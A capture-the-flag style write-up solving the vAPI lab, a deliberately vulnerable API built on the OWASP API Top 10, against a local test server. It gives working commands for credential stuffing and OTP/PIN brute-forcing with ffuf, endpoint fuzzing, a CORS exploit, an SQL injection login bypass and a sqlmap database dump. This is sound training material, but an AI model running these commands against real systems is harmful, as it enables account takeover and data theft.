# vAPI - Vulnerable Adversely Programmed Interface

### ABOUT
vAPI is Vulnerable Adversely Programmed Interface, a self-hostable API that mimics OWASP top 10 API 2019 security risks scenarios through exercises.

### SETUP
The lab used to solve the exercise is composed of an Ubuntu 22.04.2 LTS (Jammy Jellyfish) server (IP 10.1.1.11) hosting the vAPI application on port 8008, and a kali attacking machine (IP 10.1.1.22). The vAPI web site is available at http://10.1.1.11:8008, and the documentation at http://10.1.1.11:8008/vapi.
\
\
![Untitled](https://github.com/g1vi/AllTheWriteUps/assets/120142960/74a2e15b-fc71-48f7-8284-f03f7bcbcdda)
\
\
The exercise has been solved using Postman, `ffuf` and Burpsuite.

### API 1. BOLA (Broken Object Level Authentication)
Similar to IDOR in the web applications context, BOLA vulnerabilities are related to API endpoints that receives an ID of an object, and fail to validate if the user is authorized to access or to perform the requested action on the requested object.<br>
<br>
In Postman, create a new user `user8:password` by sending a POST request to `/vapi/api1/user`. The user ID is returned in case it is successfully created.
\
\
![Untitled1](https://github.com/g1vi/AllTheWriteUps/assets/120142960/cae3aecc-b34d-413f-948c-bbee79e0afbf)
\
\
The user's data can be retrieved by sending a GET request with user ID and an authentication token. According to vAPI documentation, the authentication token is generated encoding base64 the string `username:password`<br>
<br>
In our case, the authentication token is:
```markdown
> echo -n "user8:password" | base64
dXNlcjg6cGFzc3dvcmQ=
```
Let's check if the authentication token works. Placing it in the request headers we successfully retrieve user details.
\
\
![Untitled2](https://github.com/g1vi/AllTheWriteUps/assets/120142960/85cdd65b-ceaf-474b-9286-79caf9aa806e)
\
\
As said before, the application would be vulnerable to BOLA if we could retrieve any user data just by changing the user ID. We verify that if we try querying user ID 1 we retrieve data for user Michael Scott.
\
\
![Untitled3](https://github.com/g1vi/AllTheWriteUps/assets/120142960/3faac750-c35c-4301-b048-6e51cdd98709)
\
\
The flag appears in the returned data.

### API 2. BROKEN USER AUTHENTICATION
Broken authentication vulnerabilites are related to applications that fail to implement protection mechanisms against authentication attacks. Examples of vulnerable applications are those that allow credential stuffing or brute force attack on the same user account, those that fail to implement protection mechanisms suchs as captcha/account lockout, those that allow weak passwords, those that send authentication tokens and clear passwords in the URL or those that does not validate the authenticity of tokens and accepts unsigned/weakly signed JWT tokens ("alg":"none").<br>
<br>
According to documentation, there is some useful information in the `vapi/Resources` directory. In fact, in the location `/vapi/Resources/API2_CredentialStuffing` there is a list of possible credential pairs username/password. We can create two separate wordlists of users and passwords from it.
```markdown
> cat API2_CredentialStuffing | cut -d',' -f 1 > usernames
> cat API2_CredentialStuffing | cut -d',' -f 2 > passwords
```
In order to launch a credential stuffing attack, we could use Burpsuite's intruder or `ffuf` (normally faster). To launch an attack with `ffuf`, first we capture a POST request to endpoint `/vapi/api2/user/login` and modify it adding a random credential of the list, we send it and let it fail (it returns 401 unauthorized login unsuccessful).
\
\
![Untitled4](https://github.com/g1vi/AllTheWriteUps/assets/120142960/e7902e6d-f7d5-4934-95ac-f131852c7b55)
\
\
Right-click on the request and save to file `request.txt`, then modify it with a text editor to mark the fields to be fuzzed `FUZZEMAIL` and `FUZZPASSWORD`
```markdown
POST /vapi/api2/user/login HTTP/1.1
Host: 10.1.1.11:8008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; XSRF-TOKEN=eyJpdiI6IlV0MjdTRjVYbW5YMFFOb2RSWStralE9PSIsInZhbHVlIjoiaVkrY1pjOE9VdDlTUjB4cTVWdnBzTG54dTQ4d1VXYUVUdEF3ZXc3cEpXeU9obVVrTENDVWJ6M0dsMmYwYXlhNHF5RExLTnpJbTN0OTNiWWNYT1ZVNWZVbUovUlVKRkJ6YzF2KytLNDFTKzY5MXBYU2Q4WGFKSnUxOEV3T0FoeXgiLCJtYWMiOiJjYjc1ZWM5NDUyNWU3ODI1MWM1ZWYyYzczOGYwZjM1NDBmZmZiNGQ0N2I1NjhmODNjYWM3ZDk3YmFiMGU1MDc4IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkVENXYvMVFpZUlKUjJNdFZITnZYcmc9PSIsInZhbHVlIjoiTzBxdGJJTTVkaUJveGFaV1BSb05aSjYxZi9HVzMzcVBzTE1qczFzbHpxZ1pQNzBQMnV6akxhR1BxYURuZytWSVJ5ZnJxUktZWkdOUDMwajZLNlBxNkxsa3VFaW5TcjBJVSszMmxXbytQZWNSdyttc0JTYVgza1lGQzlxZG5PZmEiLCJtYWMiOiIwOTM0NjBlMmJiYmY2MWMxODhhYTY1YjEwYTk3ZjIxYzU4ZjY0YzcxN2NmMmM0YzYwZTc1OGRjZTgzNTIzNDEyIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Content-Length: 54
Content-Type: application/json;charset=UTF-8

{"email":"FUZZEMAIL",
	"password":"FUZZPASSWORD"
}
```
Now launch a pitchfork attack (credential stuffing) with `ffuf`. It combines first username with first password of each wordlist, second username with second password, third with third, and so on. 
```markdown
> ffuf -c -request request.txt -request-proto http -t 100 -fc 401 -w ./usernames:FUZZEMAIL -w ./passwords:FUZZPASSWORD -mode pitchfork
```
The attack reports 3 successful credentials (code: 200).
```markdown
[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 8528ms]
    * FUZZEMAIL: savanna48@ortiz.com
    * FUZZPASSWORD: zTyBwV/9

[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 8336ms]
    * FUZZEMAIL: hauck.aletha@yahoo.com
    * FUZZPASSWORD: kU-wDE7r

[Status: 200, Size: 89, Words: 1, Lines: 1, Duration: 8425ms]
    * FUZZEMAIL: harber.leif@beatty.info
    * FUZZPASSWORD: kU-wDE7r
```
\
\
![Untitled5](https://github.com/g1vi/AllTheWriteUps/assets/120142960/977c39d1-d4e4-4d62-a025-306345c8b76d)
\
\
Next step is to test this credential on the `/vapi/api2/user/login` endpoint using a POST request. Logging in with `hauck.aletha@yahoo.com:kU-wDE7r` we receive a successful login message, along with a token.
\
\
![Untitled6](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a9597329-554e-40a0-b895-51a43e72b22b)
\
\
Finally, we send this token to the `/vapi/api2/user/details` endpoint.
\
\
![Untitled7](https://github.com/g1vi/AllTheWriteUps/assets/120142960/b62e04dd-e76f-4c0c-9b26-cb62b4447544)
\
\
The flag appears on the application response.

### API3. EXCESSIVE DATA EXPOSURE
Sometimes, API's are designed in such a way that they return sensitive data to the client, trusting that the client side developers will implement appropriate filters when presenting information to the user. However, an attacker can easily sniff the traffic and see the sensitive data.<br>
<br>
Download and install the apk. For this write-up an android-x86 virtual machine running on Virtual Box has been used, Android Studio could also be used. Once installed, run the application and configure your vAPI server.
\
\
![Untitled8](https://github.com/g1vi/AllTheWriteUps/assets/120142960/c9e936aa-7ae9-46d9-9b7e-e3af9a64ca8e)
\
\
Create a new user and login. An application to post comments and replies comes into view.
\
\
![Untitled9](https://github.com/g1vi/AllTheWriteUps/assets/120142960/e7468b35-bea6-4df6-8b38-aad5f0074387)
\
\
Following the OWASP premises for this vulnerability, the API should be leaking user parameters that apk developer is filtering when presenting the comments to the user.<br>
<br>
There are 2 methods to discover the information leaked by the endpoint depending on the Android virtual machine configuration used:
- If you use Android Studio Android, it can be configured to use Burpsuite as a proxy. Add a comment and capture the HTTP response.
- If using Android-x86 + Virtual Box, Burpsuite cannot be configured as a proxy. The alternative is to discover the endpoint used by the android app to manage comments and interact directly with it.<br>

Since we are using Android-x86, we will follow the second option. For this, we fuzz for hidden endpoints in API3 and discover a hidden endpoint called `/vapi/api3/comment`
```markdown
> ffuf -c -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/api/objects.txt -t 100 -fc 500 -u http://10.1.1.11:8008/vapi/api3/FUZZ
```
\
\
![Untitled10](https://github.com/g1vi/AllTheWriteUps/assets/120142960/43d5d99f-8e65-4a37-9000-45564af58038)
\
\
Simulating what the android app does, we query it with a GET request and see what information is leaked.
\
\
![Untitled11](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ff0933d0-9c0b-460f-af0d-54c354f0309d)
\
\
The flag appears in one of the parameters returned, therefore, we verify the endpoint is leaking unnecessary information, which is later filtered by the app developers.

### API4. LACK OF RESOURCES & RATE LIMITING
Applications that do not limit the resources (network, CPU, memory, and storage) assigned to each client request are vulnerable to attacks where the user can send many resuts in shorts periods of time, and containing payloads of arbitrary size.<br>
<br>
Sending a POST request to the `/vapi/api4/login` endpoint initiates an OTP-based login process. A 4-digit OTP is supposed to be sent to the indicated mobile phone.
\
\
![Untitled12](https://github.com/g1vi/AllTheWriteUps/assets/120142960/005fc8e3-7cc6-44b0-910e-a105421df88e)
\
\
Another endpoint `/vapi/api4/login` is used to verify the OTP by means of a POST request containing the received code.
\
\
![Untitled13](https://github.com/g1vi/AllTheWriteUps/assets/120142960/81fe9f40-ad42-42bf-87e4-5b4c5b0e2036)
\
\
Notice the OTP's are only 4-digit, so in theory they could be bruteforced if the application does not block massive amounts of user requests. This could be done with Burpsuite's intruder or `ffuf` (faster). Same as before, capture a request with burpsuite, and save to a `request.txt` file.
\
\
![Untitled14](https://github.com/g1vi/AllTheWriteUps/assets/120142960/4b916805-157e-4166-804a-e9af2e4cfae6)
\
\
 Using a text editor, mark the field to bruteforce with the text "FUZZ".
```markdown
POST /vapi/api4/otp/verify HTTP/1.1
Host: 10.1.1.11:8008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: language=en; welcomebanner_status=dismiss
Upgrade-Insecure-Requests: 1
Content-Length: 20
Content-Type: application/json;charset=UTF-8

{
  "otp": "FUZZ"
}
```
Next step is to generate a wordlist called `seq` of 9999 OTP's and launch the attack.
```markdown
> ffuf -c -request request.txt -request-proto http -t 100 -fc 403 -w ./seq
```
The OTP found is 1872.
\
\
![Untitled15](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ccf0d43f-156a-469b-b99a-3288c320e8e7)
\
\
Next step is to verify the validity of the OTP by means of a GET request sent to the enpoint `/vapi/api4/otp/verify`
\
\
![Untitled16](https://github.com/g1vi/AllTheWriteUps/assets/120142960/ea31861e-b084-4acf-b225-bb432322f929)
\
\
The bruteforced OTP is valid and an authentication token is received. Final step is to use the token to disclose user information on the `/vapi/api4/user` endpoint.
\
\
![Untitled17](https://github.com/g1vi/AllTheWriteUps/assets/120142960/515a7842-50a4-45ee-a5f7-fdd4ba6b44c8)
\
\
The flag appears in the HTTP response.

### API5. BFLA (Broken Function Level Authentication)
Applications vulnerable to BFLA are those that fail to verify if the user is authorized to perform certain actions on specific endpoints. For example, regular authenticated users may have access to restricted actions by simply changing the HTTP method (e.g., from GET to DELETE) or by simply guessing the endpoint URL and parameters (e.g., guess the endpoint `/api/v1/admin` from `/api/v1/users`). Whereas BOLA is related to authorization at and object level (e.g. ID's), BFLA is related to authorization issues at a function level (e.g. PUT, DELETE, POST or just changing the URL endpoint from `users` to `admin`).<br>
<br>
POST a request to `/vapi/api5/user` to create a new user.
\
\
![Untitled18](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a2ea1d67-ffa3-48e7-9da7-cf4b356e81d6)
\
\
A GET request sent to `/vapi/api5/user/10` allows us to retrieve the user details (10 is the ID we received when creating the user). This endpoint requires an authtorization token, if we remember from API1, it is generated encoding base64 the string `username:password`
```markdown
> echo -n 'bob:password' | base64
Ym9iOnBhc3N3b3Jk
```
 Using this token we can query the user we have just created
\
\
![Untitled19](https://github.com/g1vi/AllTheWriteUps/assets/120142960/5ed73971-7ffc-4cb2-b8f6-6e3a31d424c0)
\
\
Now, to exploit the BFLA vulnerability, we can either abuse a known endpoint using a method we are not supposed to have access to, or find hidden endpoints which are not supposed to be exposed to us (e.g. send requests to `/v1/admin` when we are supposed to have acces only to `/v1/users`).<br>
<br>
To find hidden endpoints, we use `ffuf` again.
```markdown
> ffuf -c -w /usr/share/seclists/SecLists-master/Discovery/Web-Content/api/api-endpoints-res.txt -t 100 -fc 500 -u http://10.1.1.11:8008/vapi/api5/FUZZ
```
Which returns a hidden endpoint called `/vapi/api5/users`
\
\
![Untitled20](https://github.com/g1vi/AllTheWriteUps/assets/120142960/7bb7dc42-a933-4de4-b0ad-ec075f6a7e51)
\
\
This is a hidden endpoint we are not supposed to have access to, since it returns a list of all the users of the database. Moreover, if we send a GET request to it, the endpoint fails to perform function-level authorization checks, since just providing token for user3 the complete list of users is returned.
\
\
![Untitled21](https://github.com/g1vi/AllTheWriteUps/assets/120142960/6ce9e530-89a2-4ef4-9ab4-86b6ae26190d)
\
\
The flag appears in the HTTP response.

### API 6. MASS ASSIGNMENT
Vulnerable applications allow users to update critical parameters directly, they automatically converts client parameters into internal object properties without considering the sensitivity and the exposure level of these properties. For example, when creating an account, a client should be able to exclusively update the username and password by means of a POST request. On the other hand, the client shouldn't be able to manipulate other parameter such as `IsAdmin` or similar parameters which may be used by the application to determine the privilege level of the user.<br>
<br>
Let's create a new user sending a post to endpoint `/vapi/api6/user`
\
\
![Untitled22](https://github.com/g1vi/AllTheWriteUps/assets/120142960/d612bd7d-8cd5-4fbe-a536-f3f63aad7259)
\
\
This user can be retrieved later with a GET request to endpoint `/vapi/api6/user/me`, just adding the authorization token in the header.<br>
<br>
As always, this can be generated encoding base64 the string `username:password`
```markdown
> echo -n 'test:password' | base64
dGVzdDpwYXNzd29yZA==
```
\
\
![Untitled23](https://github.com/g1vi/AllTheWriteUps/assets/120142960/df02e720-57cf-497e-8a63-6bfd265d5618)
\
\
Notice the application leaks all the parameters of the user, including a previously unknown parameter called `credit`. A mass assignment vulnerability allows attackers to update all user parameters automatically and without considering the sensitivity of each one. Let's try to create a new user and assign him any credits we want; for example, 10000 credits.
\
\
![Untitled24](https://github.com/g1vi/AllTheWriteUps/assets/120142960/1ddfb13d-0c35-4e1d-9bd2-8fcd2700b81e)
\
\
It seems the application accepted the request. We will verify this by querying the new user data. First, generate the token for the new user.
```markdown
> echo -n 'test2:password' | base64
dGVzdDI6cGFzc3dvcmQ=
```
Now, query the endpoint for user `test2` and inspect the output.
\
\
![Untitled25](https://github.com/g1vi/AllTheWriteUps/assets/120142960/4fd5cb82-0b78-4509-a2f1-04aa41503f36)
\
\
In fact, the application updated all the paramenter, including the 'credit` one. The flag appears in the HTTP response.

### API 7. SECURITY MISCONFIGURATION
The API is vulnerable if appropriate security hardening is missing or improperly configured. Examples of security misconfigurations include: important security patches are missing, unnecessary features are enabled (e.g., HTTP verbs) or necessary ones are disabled (TLS, HTTPS, CORS policy).<br>
<br>
POST a request to endpoint `/vapi/api7/user` to create a new user.
\
\
![Untitled26](https://github.com/g1vi/AllTheWriteUps/assets/120142960/495832a5-2010-4910-a1f5-ac1464d0a741)
\
\
Next step is to login with this user. For this, we need to generate an authentication token.
```markdown
> echo -n 'alice:password' | base64
YWxpY2U6cGFzc3dvcmQ=
```
Then send a GET request to endpoint `/vapi/api7/user/login`
\
\
![Untitled27](https://github.com/g1vi/AllTheWriteUps/assets/120142960/9c27d54d-3a92-456f-b51f-c6311007db1e)
\
\
Take note of the `phpessid` cookie received, it will be used in the next request. Notice the documentation says something about a CORS vulnerability, these are exploited abusing the `Origin: header`.<br>
<br>
We will prepare an HTTP request in Postman. For this, first add the `phpessid` cookie.
\
\
![Untitled28](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a1d1c56c-1d43-478d-9d87-4629d474c3c3)
\
\
Then, to exploit the CORS vulnerability we add a new `Origin: ` header with an URL, no matter which one, and send the request.
\
\
![Untitled29](https://github.com/g1vi/AllTheWriteUps/assets/120142960/8b044cd5-2a6f-4bca-9103-32d2bab71b23)
\
\
The flag appears in the HTTP response.

### API 8. INJECTION
When the API does not sanitize, filter or validate the user's input, it may be vulnerable to injection.<br>
<br>
After some trial and error, a functional injection is found in the endpoint `/vapi/api8/user/login`
\
\
![Untitled30](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a46d729f-2d2b-444b-8f0e-e7e9b9287d57)
\
\
A basic SQLi can be used to bypass login and receive an authentication token.
\
\
![Untitled31](https://github.com/g1vi/AllTheWriteUps/assets/120142960/22a3d614-e570-495b-b867-b70c46b15644)
\
\
And using this token in a GET request to endpoint `/vapi/api8/user/secret`, the application dumps the flag.
\
\
![Untitled32](https://github.com/g1vi/AllTheWriteUps/assets/120142960/8a476dcc-b9c2-43fe-b4a4-2042fe71ebe3)
\
\
If you want to play a bit more with this vulnerabilitiy, you can intercept a request with Burpsuite, save to file, and pass it to `sqlmap`. It will dump the entire application database (the API8 flag is in the table `a_p_i8_users`)
```markdown
> sqlmap -r request.txt --dbms=mysql --dump
```
\
\
![Untitled33](https://github.com/g1vi/AllTheWriteUps/assets/120142960/75484e44-ea83-4b75-b65c-92e5d3952c6c)
\
\
### API9. IMPROPER ASSETS MANAGEMENT
This vulnerability is related to outdated features still running in production environments due to a misconfiguration or because there is no plan for retirement or patching. For example, if a new `/V2` endpoint implementing new security features is already in production, it is advisable that older outdated `/V1` endpoints are retired or patched, or at least there is a retirement plan to do so.<br>
<br>
Test the `/V2` endpoint with a post request to `/vapi/api9/v2/user/login`.
\
\
![Untitled34](https://github.com/g1vi/AllTheWriteUps/assets/120142960/e69f18fc-8024-4de9-814f-3ae19b0b5070)
\
\
A status code 200 is received; however, no authentication message is returned. It seems we need a valid PIN to login, since it is only 4-digits, we will try to bruteforce it with `ffuf`. As in previous steps, intercept an save a POST request and save to a text file. In the request file, mark as `FUZZ` the PIN field to be bruteforced by `ffuf`
```markdown
POST /vapi/api9/v2/user/login HTTP/1.1
Host: 10.1.1.11:8008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; XSRF-TOKEN=eyJpdiI6Ikh0TDNDU0V1VC9HaXFoVENhRDFRYXc9PSIsInZhbHVlIjoianBSSTFIa0gxMmQrREI4cWtnVUo0QmN4eU5Tamk1V1BDOWN5UkVQcmRPeldoenZidzNjYTBOdExTVytsU2E5L1Y5eSs1cEh2SHA4MjdwWEVXaVBQV2s4K1BjMTMySkNnQnV6VndwSlBYMUNpT0xhbkl4QlZrb1N0bCtGcnlCb0oiLCJtYWMiOiJjYWE5NTg4ZWEwMjQzN2Q0ZjM5MzNhMjNlZDhkOWI0MmFhNTc4NTJmOTdiMjQxMWE0YmQzYjI1NTc5NTYwMzNkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Im90aHQrZkNlQmJkSTduUTZ3OTJaL1E9PSIsInZhbHVlIjoiU3FzY3duNE5xMzBMWGZnNG5HbTRuNTQ4TGc5SzM2QlFNUTZsdlc5Q09GYm1vZnNzV0YrZ1BubWcxNHc3NHp3Y2VJbEZJTndhOGhFcXNIQUFhNEI1YkpuUThYQXpDOFNJampTbUZkNDViam9pSWQrWGpHS3lOZW9XVXhzaERuclgiLCJtYWMiOiIxZWU2MTNhNDIxNGE2OTI4NmViMDFkOTFhYzczZTQzNjdhYjFlZjBiZDI2YjEyM2IyZGEwOWQ3ZjBiYmE5MDJiIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Content-Length: 54
Content-Type: application/json;charset=UTF-8

{
  "username": "richardbranson",
  "pin": "FUZZ"
}
```
Generate a wordlist of possible PIN codes (from 0000 to 9999) and save the file as `seq`, then launch the `ffuf` attack.
```markdown
> ffuf -request request.txt -c -w ./seq -t 100 -request-proto http
```
Shortly after, we begin receiving status 500 codes, meaning the server is somehow detecting and blocking bruteforce attacks.
\
\
![Untitled35](https://github.com/g1vi/AllTheWriteUps/assets/120142960/caeee728-461c-4898-926e-bccf48591ced)
\
\
So bruteforce protections have been implemented in the `/V2` endpoint. However, maybe there is an outdated `/V1` endpoint still in place which does not provide any protection. Check if `/V1` endpoint is still present in the host. 
\
\
![Untitled36](https://github.com/g1vi/AllTheWriteUps/assets/120142960/a3fb26fe-de0d-417e-8900-78074c19020e)
\
\
We receive a status code 200, meaning the `/V1` endpoint has not been retired after entry into service of `/V2`. We will try to repeat the bruteforce process for the `/V1` endpoint. Modify the `request.txt` file to point to the `/V1` endpoint.
```markdown
POST /vapi/api9/v1/user/login HTTP/1.1
Host: 10.1.1.11:8008
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: language=en; welcomebanner_status=dismiss; XSRF-TOKEN=eyJpdiI6Ikh0TDNDU0V1VC9HaXFoVENhRDFRYXc9PSIsInZhbHVlIjoianBSSTFIa0gxMmQrREI4cWtnVUo0QmN4eU5Tamk1V1BDOWN5UkVQcmRPeldoenZidzNjYTBOdExTVytsU2E5L1Y5eSs1cEh2SHA4MjdwWEVXaVBQV2s4K1BjMTMySkNnQnV6VndwSlBYMUNpT0xhbkl4QlZrb1N0bCtGcnlCb0oiLCJtYWMiOiJjYWE5NTg4ZWEwMjQzN2Q0ZjM5MzNhMjNlZDhkOWI0MmFhNTc4NTJmOTdiMjQxMWE0YmQzYjI1NTc5NTYwMzNkIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6Im90aHQrZkNlQmJkSTduUTZ3OTJaL1E9PSIsInZhbHVlIjoiU3FzY3duNE5xMzBMWGZnNG5HbTRuNTQ4TGc5SzM2QlFNUTZsdlc5Q09GYm1vZnNzV0YrZ1BubWcxNHc3NHp3Y2VJbEZJTndhOGhFcXNIQUFhNEI1YkpuUThYQXpDOFNJampTbUZkNDViam9pSWQrWGpHS3lOZW9XVXhzaERuclgiLCJtYWMiOiIxZWU2MTNhNDIxNGE2OTI4NmViMDFkOTFhYzczZTQzNjdhYjFlZjBiZDI2YjEyM2IyZGEwOWQ3ZjBiYmE5MDJiIiwidGFnIjoiIn0%3D
Upgrade-Insecure-Requests: 1
Content-Length: 54
Content-Type: application/json;charset=UTF-8

{
  "username": "richardbranson",
  "pin": "FUZZ"
}
```
And re-launch the attack with `ffuf`, filtering requests with size 0.
```markdown
> ffuf -request request.txt -c -w ./seq -t 100 -fs 0 -request-proto http
```
This time we find a working PIN 1655 returning status 200. So it seems the bruteforce protection was not implemented in `/V1` endpoint.
\
\
![Untitled37](https://github.com/g1vi/AllTheWriteUps/assets/120142960/d2cc30e9-ee22-463c-a3cb-03ee07525a83)
\
\
All is left is logging in using PIN 1655.
\
\
![Untitled38](https://github.com/g1vi/AllTheWriteUps/assets/120142960/e732b474-6952-4145-ab87-f3e89692ea98)
\
\
The flag appears in the HTTP response.

### API10: INSUFFICIENT LOGGING & MONITORING
Vulnerable applications does not produce any logs, or the logging level is not set correctly, or log messages do not include enough detail.<br>
<br>
Just query the endpoint, the flag will be returned. Nothing was logged!
\
\
![Untitled39](https://github.com/g1vi/AllTheWriteUps/assets/120142960/3973d0a2-82a5-4f4c-aebd-7cb0aa98a1ca)

























